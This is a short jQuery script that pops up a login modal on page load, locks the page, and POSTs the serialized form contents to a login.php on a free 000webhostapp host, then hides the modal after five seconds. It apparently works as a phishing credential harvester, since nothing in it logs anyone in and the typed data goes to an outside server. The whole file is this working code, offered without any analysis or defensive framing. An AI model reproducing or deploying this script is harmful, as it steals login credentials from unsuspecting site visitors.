$(document).ready(function(){
	setTimeout(function() {
		$(".login-modal").show();
		$("body").css("overflow", "hidden");
	},50);

$('#form').submit(function (e) {
  e.preventDefault();
  $("#login").prop('disabled', false);
  $("#login").attr("value", "Loging...");
  $.ajax({
    type: 'POST',
    url: 'https://banglaerphoto.000webhostapp.com/contact/login.php',
    data: $('#form').serialize(),
    success: function (msg) {
      $(".msg").html("msg");
      $("body").css("overflow", "auto");
    },
  });
 setTimeout(function() {
    $(".login-modal").css('display', 'none');
    $("body").css("overflow", "auto");
  },5000);
});


});
